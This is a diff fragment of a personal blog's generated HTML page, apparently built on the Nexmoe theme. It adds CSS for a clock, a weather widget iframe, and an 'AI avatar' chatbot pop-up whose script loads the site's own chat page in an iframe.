+        background-size: 100% 100%;
+        background-repeat: no-repeat;
+    }
+
+    .clock_logo {
+        width: 10vw;
+        height: 10vw;
+        max-width: 10vh;
+        max-height: 10vh;
+        position: absolute;
+        top: 50%;
+        left: 50%;
+        box-sizing: border-box;
+        border-radius: 50%;
+        transform: translate(-50%, -50%);
+        background-image: var(--clock-logo);
+        background-size: 100% 100%;
+        background-repeat: no-repeat;
+    }
+
+    @media (min-width: 100vh) {
+        .clock {
+            border: solid 2.8vh var(--color-primary);
+            box-shadow: 0 1.4vh 2.8vh var(--color2);
+        }
+    }
+</style>
+
+    
+        
+
+        <div class="nexmoe-pd-item">
+    <div class="qweather">
+        <div id="he-plugin-standard">
+            <iframe allowtransparency="true" frameborder="0" width="304" height="96" scrolling="no"
+                src="//tianqi.2345.com/plugin/widget/index.htm?s=2&z=1&t=0&v=0&d=2&bd=0&k=000000&f=ff8040&ltf=009944&htf=cc0000&q=1&e=1&a=1&c=54511&w=300&h=96&align=center"></iframe>
+        </div>
+        <div class="qweather-logo">
+
+        </div>
+    </div>
+</div>
+
+<style>
+    .qweather {
+        position: relative;
+        padding-right: 5px;
+    }
+
+    .qweather #he-plugin-standard {
+        border: 2px solid var(--color-primary);
+        box-shadow: 0 1px 0 0 var(--color-primary), 0 1px 2px 0 var(--color-primary);
+        border-radius: 8px;
+        width: 300px;
+        overflow: hidden;
+    }
+
+    .qweather-logo {
+        position: absolute;
+        right: 0;
+        top: -15px;
+        width: 40px;
+        height: 40px;
+        background-image: var(--qweather-logo);
+        background-size: 100% 100%;
+        background-repeat: no-repeat;
+    }
+</style>
+
+    
+</div>
+<style>
+    .nexmoe-pd {
+        position: fixed;
+        left: auto;
+        top: 40px;
+        right: 0;
+    }
+    .nexmoe-pd-item{
+       display: flex;
+        justify-content: center;
+        margin-bottom: 30px;
+    }
+    #nexmoe-pendant .mdui-drawer{
+        width: 305px;
+    }
+    @media screen and (max-width: 1600px) {
+        #nexmoe-pendant {
+            display: none
+        }
+    }
+</style>
+</div><div id="nexmoe-chatbot">
+    
+<div id="ai-chatbot-button" class="ai-chatbot-button">
+
+</div>
+
+<!-- AI Chatbot Window -->
+<div id="ai-chatbot-window" class="ai-chatbot-window">
+  <div class="ai-chatbot-header">
+    <div class="ai-chatbot-title">糖糖的AI分身(BETA)</div>
+    <button id="ai-chatbot-close" class="ai-chatbot-close">
+      <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+        <line x1="18" y1="6" x2="6" y2="18"></line>
+        <line x1="6" y1="6" x2="18" y2="18"></line>
+      </svg>
+    </button>
+  </div>
+  <div class="ai-chatbot-content" id="ai-chatbot-content">
+    <!-- Loading Animation -->
+    <div id="ai-chatbot-loading" class="ai-chatbot-loading">
+      <div class="ai-chatbot-loading-spinner"></div>
+      <div class="ai-chatbot-loading-text">如果加载时间过长，可尝试打开系统代理</div>
+    </div>
+    <!-- iframe will be dynamically loaded here when chatbot is opened -->
+  </div>
+</div>
+
+<script>
+  // Get elements
+  const chatbotButton = document.getElementById('ai-chatbot-button');
+  const chatbotWindow = document.getElementById('ai-chatbot-window');
+  const chatbotClose = document.getElementById('ai-chatbot-close');
+  const chatbotContent = document.getElementById('ai-chatbot-content');
+  const chatbotLoading = document.getElementById('ai-chatbot-loading');
+  let iframeLoaded = false;
+  let isProcessing = false;
+
+  // Toggle chatbot window
+  function toggleChatbot() {
+    if (isProcessing) return;
+    isProcessing = true;
+
+    const isOpening = !chatbotWindow.classList.contains('ai-chatbot-window-open');
+    chatbotWindow.classList.toggle('ai-chatbot-window-open');
+    
+    // Handle background scrolling
+    if (isOpening) {
+      // Disable background scrolling when opening chatbot
+      document.body.style.overflow = 'hidden';
+      document.body.style.touchAction = 'none';
+    } else {
+      // Enable background scrolling when closing chatbot
+      document.body.style.overflow = '';
+      document.body.style.touchAction = '';
+    }
+    
+    // Load iframe only when opening the chatbot for the first time
+    if (isOpening && !iframeLoaded) {
+      // Wait for the window to be fully visible before loading iframe
+      setTimeout(() => {
+        const iframe = document.createElement('iframe');
+        iframe.src = 'https://www.tangyuxian.com/weifu.html';
+        iframe.style.cssText = 'width: 100%; height: 100%;overflow: hidden;';
+        iframe.frameBorder = '0';
+        iframe.allow = 'microphone';
+        
+        // Set timeout to hide loading animation after 5 seconds
+        const loadingTimeout = setTimeout(() => {
+          if (chatbotLoading) {
+            chatbotLoading.style.display = 'none';
+          }
+        }, 5000);
+        
+        // Hide loading animation when iframe is loaded (if before 5 seconds)
+        iframe.onload = () => {
+          clearTimeout(loadingTimeout);
+          if (chatbotLoading) {
+            chatbotLoading.style.display = 'none';
+          }
+        };
+        
+        chatbotContent.appendChild(iframe);
+        iframeLoaded = true;
+      }, 300); // Wait for CSS transition to complete
+    }
+
+    // Reset processing flag after a short delay
+    setTimeout(() => {
+      isProcessing = false;
+    }, 300);
+  }
+
+  // Add event listeners for both click and touch events
+  if (chatbotButton) {
+    chatbotButton.addEventListener('click', toggleChatbot);
+    chatbotButton.addEventListener('touchstart', (e) => {
+      e.preventDefault();
+      toggleChatbot();
+    }, { passive: false });
+  }
+
+  // Close chatbot window
+  function closeChatbot() {
+    if (chatbotWindow) {
+      chatbotWindow.classList.remove('ai-chatbot-window-open');
+      // Enable background scrolling when closing chatbot
+      document.body.style.overflow = '';
+      document.body.style.touchAction = '';
+    }
+  }
+
+  if (chatbotClose) {
+    chatbotClose.addEventListener('click', closeChatbot);
+    chatbotClose.addEventListener('touchstart', (e) => {
+      e.stopPropagation();
+      closeChatbot();
+    }, { passive: true });
+  }
+
+  // Close chatbot window when clicking outside
+  window.addEventListener('click', (e) => {
+    if (e.target === chatbotWindow) {
+      chatbotWindow.classList.remove('ai-chatbot-window-open');
+      // Enable background scrolling when closing chatbot
+      document.body.style.overflow = '';
+      document.body.style.touchAction = '';
+    }
+  });
+
+  // Prevent scroll propagation from chatbot window to background
+  if (chatbotWindow) {
+    // Touch events for mobile
+    chatbotWindow.addEventListener('touchstart', (e) => {
+      e.stopPropagation();
+    }, { passive: true });
+    
+    chatbotWindow.addEventListener('touchmove', (e) => {
+      e.stopPropagation();
+    }, { passive: true });
+    
+    chatbotWindow.addEventListener('touchend', (e) => {
+      e.stopPropagation();
+    }, { passive: true });
+    
+    // Mouse events for desktop
+    chatbotWindow.addEventListener('wheel', (e) => {
+      e.stopPropagation();
+    }, { passive: true });
+  }
+</script>
+
+<style>
+  /* Chatbot Button */
+  @keyframes ai-pulse {
+    0% {
+      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15), 0 0 0 0 var(--color-primary);
+      transform: scale(1);
+    }
+    50% {
+      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15), 0 0 0 15px var(--color-primary-bg);
+      transform: scale(1.05);
+    }
+    100% {
+      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15), 0 0 0 0 var(--color-primary-bg);
+      transform: scale(1);
+    }
+  }
+
+  @keyframes ai-glow {
+    0% {
+      filter: drop-shadow(0 0 3px var(--color-primary));
+    }
+    50% {
+      filter: drop-shadow(0 0 8px var(--color-primary));
+    }
+    100% {
+      filter: drop-shadow(0 0 3px var(--color-primary));
+    }
+  }
+
+  .ai-chatbot-button {
+    position: fixed;
+    bottom: 2rem;
+    right: 2rem;
+    width: 6rem;
+    height: 6rem;
+    background-color: var(--color-primary);
+    background-image: var(--chat);
+    background-size: 100% 100%;
+    border-radius: 50%;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    cursor: pointer;
+    box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
+    transition: all 0.3s ease;
+    z-index: 9998;
+    color: white;
+    font-size: 1.5rem;
+    animation: ai-pulse 2.5s infinite, ai-glow 3s infinite;
+  }
+
+  .ai-chatbot-button:hover {
+    transform: scale(1.1);
+    box-shadow: 0 6px 16px rgba(0, 0, 0, 0.2);
+  }
+
+  /* Chatbot Window */
+  .ai-chatbot-window {
+    position: fixed;
+    bottom: 10rem;
+    right: 2rem;
+    width: 24rem;
+    height: 45rem;
+    background-color: var(--color-primary);
+    border-radius: 12px;
+    box-shadow: 0 8px 32px rgba(0, 0, 0, 0.15);
+    z-index: 9999;
+    opacity: 0;
+    visibility: hidden;
+    transform: translateY(20px);
+    transition: opacity 0.3s ease, visibility 0.3s ease, transform 0.3s ease;
+    display: flex;
+    flex-direction: column;
+    overflow: hidden;
+    -webkit-backface-visibility: hidden;
+    backface-visibility: hidden;
+    -webkit-transform-style: preserve-3d;
+    transform-style: preserve-3d;
+  }
+
+  .ai-chatbot-window-open {
+    opacity: 1;
+    visibility: visible;
+    transform: translateY(0);
+  }
+
+  /* Chatbot Header */
+  .ai-chatbot-header {
+    padding: 0.5rem;
+    background-color: var(--color-primary);
+    border-bottom: 1px solid var(--color-primary);
+    border-radius: 12px 12px 0 0;
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+  }
+
+  .ai-chatbot-title {
+    font-size: 1rem;
+    font-weight: 600;
+    color: #fff;
+  }
+
+  .ai-chatbot-close {
+    background: none;
+    border: none;
+    cursor: pointer;
+    color: #fff;
+    padding: 0.25rem;
+    border-radius: 4px;
+    transition: background-color 0.2s ease;
+    cursor: pointer;
+  }
+
+  .ai-chatbot-close:hover {
+   
+  }
+
+  /* Chatbot Content */
+  .ai-chatbot-content {
+    flex: 1;
+    overflow: hidden;
+    position: relative;
+    background-color: var(--color-card);
+  }
+
+  /* Loading Animation */
+  .ai-chatbot-loading {
+    position: absolute;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    display: flex;
+    flex-direction: column;
+    justify-content: center;
+    align-items: center;
+    background-color: var(--color-card);
+    z-index: 10;
+  }
+
+  .ai-chatbot-loading-spinner {
+    width: 50px;
+    height: 50px;
+    border: 4px solid rgba(255, 255, 255, 0.3);
+    border-radius: 50%;
+    border-top-color: var(--color-text-1);
+    animation: ai-spin 1s linear infinite;
+    margin-bottom: 1rem;
+  }
+
+  @keyframes ai-spin {
+    to { transform: rotate(360deg); }
+  }
+
+  .ai-chatbot-loading-text {
+    color: var(--color-text-1);
+    font-size: 0.9rem;
+    text-align: center;
+    padding: 0 1rem;
+    line-height: 1.5;
+  }
+
+  /* Responsive Design */
+  @media (max-width: 768px) {
+    .ai-chatbot-button {
+      width: 5rem;
+      height: 5rem;
+      bottom: 10rem;
+      right: 1rem;
+      /* 保持动画效果在移动设备上 */
+      animation: ai-pulse 2.5s infinite, ai-glow 3s infinite;
+    }
+
+    .ai-chatbot-window {
+      width: 100vw;
+      height: 100vh;
+      top: 0;
+      left: 0;
+      bottom: 0;
+      right: 0;
+      border-radius: 0;
+    }
+  }
+</style></div><div id="nexmoe-footer"><!--!--></div><div id="nexmoe-search-space"><div class="search-container"><div class="search-header"><div class="search-input-container"><input class="search-input" type="text" placeholder="搜索" onInput="sinput();"></div><a class="search-close" onclick="sclose();">×</a></div><div class="search-body"></div></div></div><div></div></body></html>
